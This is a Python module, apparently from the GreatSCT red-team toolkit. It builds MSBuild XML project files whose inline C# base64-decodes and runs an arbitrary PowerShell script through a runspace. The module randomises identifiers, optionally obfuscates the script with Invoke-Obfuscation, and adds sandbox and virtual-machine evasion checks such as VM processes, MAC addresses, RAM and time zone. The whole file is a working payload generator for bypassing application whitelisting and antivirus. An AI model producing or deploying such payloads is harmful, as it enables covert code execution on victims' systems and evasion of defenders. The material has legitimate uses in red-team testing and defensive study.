"""

MSBuild C# powershell embeded script execution.
Uses basic variable renaming obfuscation.
Optional: Obfuscate powershell embedded script with Invoke-Obfuscation

Code based on: https://gist.github.com/ConsciousHacker/a40204cbcf566d1f45d68508157d9aea

Module built by @ConsciousHacker

"""

import base64
from Tools.Bypass.bypass_common import encryption
from Tools.Bypass.bypass_common import bypass_helpers
from Tools.Bypass.bypass_common import gamemaker
from Tools.Bypass.bypass_common import shellcode_help
from Tools.Bypass.bypass_common import invoke_obfuscation


class PayloadModule:

    def __init__(self, cli_obj):
        # required
        self.language = "msbuild_powershell"
        self.extension = "xml"
        self.rating = "Excellent"
        self.description = "MSBuild C# powershell embedded script execution"
        self.name = "MSBuild C# Flat Shellcode Injector"
        self.path = "msbuild/powershell/script"
        self.cli_opts = cli_obj
        self.payload_source_code = ''
        if cli_obj.msfvenom is not None:
            self.payload_type = cli_obj.msfvenom
        elif not cli_obj.tool:
            self.payload_type = ''
        self.cli_shellcode = False

        # options we require user ineraction for- format is {OPTION : [Value, Description]]}
        self.required_options = {
            "SCRIPT"         : ["/root/script.ps1", "Path of the powershell script"],
            "FUNCTION"       : ["None", "Function to execute within the powershell script"],
            "HOSTNAME"       : ["X", "Optional: Required system hostname"],
            "DOMAIN"         : ["X", "Optional: Required internal domain"],
            "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
            "USERNAME"       : ["X", "Optional: The required user account"],
            "USERPROMPT"     : ["FALSE", "Window pops up prior to payload"],
            "MINRAM"         : ["FALSE", "Require a minimum of 3 gigs of RAM"],
            "UTCCHECK"       : ["FALSE", "Check that system isn't using UTC time zone"],
            "VIRTUALPROC"    : ["FALSE", "Check for known VM processes"],
            "MINBROWSERS"    : ["FALSE", "Minimum of 2 browsers"],
            "BADMACS"        : ["FALSE", "Checks for known bad mac addresses"],
            "MINPROCESSES"   : ["X", "Minimum number of processes running"],
            "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"],
            "OBFUSCATION"    : ["X", "Optional: Use python Invoke-Obfuscation on the powershell script"]
                                }

    def generate(self):

        # randomize all our variable names, yo'
        targetName = bypass_helpers.randomString()
        namespaceName = bypass_helpers.randomString()
        className = bypass_helpers.randomString()
        FunctionName = bypass_helpers.randomString()

        num_tabs_required = 0

        # get 12 random variables for the API imports
        r = [bypass_helpers.randomString() for x in range(12)]
        y = [bypass_helpers.randomString() for x in range(17)]

        with open(self.required_options["SCRIPT"][0], "r") as f:
            the_script = f.read()

        if self.required_options["OBFUSCATION"][0].lower() != "x":

            # Append FUNCTION to end of script
            the_script += "\n{0}".format(self.required_options["FUNCTION"][0])
            the_script = invoke_obfuscation.asciiEncode(the_script)

            # The header for MSBuild XML files
            # TODO: Fix the awful formatting
            # Set FUNCTION to None if using Invoke-Obfuscation
            msbuild_header = """<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">\n<!-- C:\Windows\Microsoft.NET\Framework\\v4.0.30319\msbuild.exe SimpleTasks.csproj -->\n<!-- Author: Chris Spehn, Twitter: @ConsciousHacker -->\n<!-- Generated by GreatSCT: https://github.com/GreatSCT/GreatSCT -->\n\t
            <PropertyGroup>
                <FunctionName Condition="'$(FunctionName)' == ''">{2}</FunctionName>
                <Cmd Condition="'$(Cmd)' == ''">None</Cmd>
            </PropertyGroup>
            <Target Name="{0}">
                <{1} />
              </Target>
              <UsingTask
                TaskName="{1}"
                TaskFactory="CodeTaskFactory"
                AssemblyFile="C:\Windows\Microsoft.Net\Framework\\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
                <Task>
                    <Reference Include="System.Management.Automation" />
                <Code Type="Class" Language="cs">
                  <![CDATA[
            """.format(targetName, className, "None")

        else:
            # The header for MSBuild XML files
            # TODO: Fix the awful formatting
            # Set FUNCTION to None if using Invoke-Obfuscation
            msbuild_header = """<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">\n<!-- C:\Windows\Microsoft.NET\Framework\\v4.0.30319\msbuild.exe SimpleTasks.csproj -->\n<!-- Author: Chris Spehn, Twitter: @ConsciousHacker -->\n<!-- Generated by GreatSCT: https://github.com/GreatSCT/GreatSCT -->\n\t
            <PropertyGroup>
                <FunctionName Condition="'$(FunctionName)' == ''">{2}</FunctionName>
            </PropertyGroup>
            <Target Name="{0}">
                <{1} />
              </Target>
              <UsingTask
                TaskName="{1}"
                TaskFactory="CodeTaskFactory"
                AssemblyFile="C:\Windows\Microsoft.Net\Framework\\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
                <Task>
                    <Reference Include="System.Management.Automation" />
                <Code Type="Class" Language="cs">
                  <![CDATA[
            """.format(targetName, className, self.required_options["FUNCTION"][0])

        #required syntax at the beginning of any/all payloads
        payload_code = "using System; using System.IO; using System.Reflection; using System.Runtime.InteropServices; using System.Collections.ObjectModel; using System.Management.Automation; using System.Management.Automation.Runspaces; using System.Text; using Microsoft.Build.Framework; using Microsoft.Build.Utilities;\n"
        payload_code += "public class %s : Task, ITask {\n" % (className)
        payload_code += "\npublic string {0} = \"$(FunctionName)\";".format(FunctionName)

        payload_code2, num_tabs_required = gamemaker.senecas_games(self)
        payload_code = payload_code + payload_code2
        num_tabs_required += 1

        encodedScriptContents = base64.b64encode(bytes(the_script, 'latin-1')).decode('ascii')
        encodedScript = bypass_helpers.randomString()
        powershellCmd = bypass_helpers.randomString()
        data = bypass_helpers.randomString()
        command = bypass_helpers.randomString()
        RunPSCommand = bypass_helpers.randomString()
        cmd = bypass_helpers.randomString()
        runspace = bypass_helpers.randomString()
        scriptInvoker = bypass_helpers.randomString()
        pipeline = bypass_helpers.randomString()
        results = bypass_helpers.randomString()
        stringBuilder = bypass_helpers.randomString()
        obj = bypass_helpers.randomString()
        RunPSFile = bypass_helpers.randomString()
        script = bypass_helpers.randomString()
        ps = bypass_helpers.randomString()
        e = bypass_helpers.randomString()

        payload_code += """string {0} = "{1}";
                    string {2} = "";

					if ({17} != "None")
					{{
						byte[] {3} = Convert.FromBase64String({0});
						string {4} = Encoding.ASCII.GetString({3});
						{2} = {4} + "" + {17};
					}}
                    else
                    {{
                        byte[] {3} = Convert.FromBase64String({0});
                        string {4} = Encoding.ASCII.GetString({3});
                        {2} = {4};
                    }}

					try
					{{
						Console.Write({5}({2}));
					}}
					catch (Exception {16})
					{{
						Console.Write({16}.Message);
					}}


								return true;
				}}

				//Based on Jared Atkinson's And Justin Warner's Work
				public static string {5}(string {6})
				{{

					Runspace {7} = RunspaceFactory.CreateRunspace();
					{7}.Open();
					RunspaceInvoke {8} = new RunspaceInvoke({7});
					Pipeline {9} = {7}.CreatePipeline();


					{9}.Commands.AddScript({6});


					{9}.Commands.Add("Out-String");
					Collection<PSObject> {10} = {9}.Invoke();
					{7}.Close();


					StringBuilder {11} = new StringBuilder();
					foreach (PSObject {12} in {10})
					{{
						{11}.Append({12});
					}}
					return {11}.ToString().Trim();
				 }}

				 public static void {13}(string {14})
				{{
					PowerShell {15} = PowerShell.Create();
					{15}.AddScript({14}).Invoke();
				}}""".format(encodedScript, encodedScriptContents, powershellCmd, data, command, RunPSCommand, cmd, runspace, scriptInvoker, pipeline, results, stringBuilder, obj, RunPSFile, script, ps, e, FunctionName)

        while (num_tabs_required != 0):
            payload_code += '\t' * num_tabs_required + '}'
            num_tabs_required -= 1

        payload_code += "\n\t\t\t\t]]>\n\t\t\t</Code>\n\t\t</Task>\n\t</UsingTask>\n</Project>"
        payload_code = msbuild_header + payload_code

        self.payload_source_code = payload_code
        return
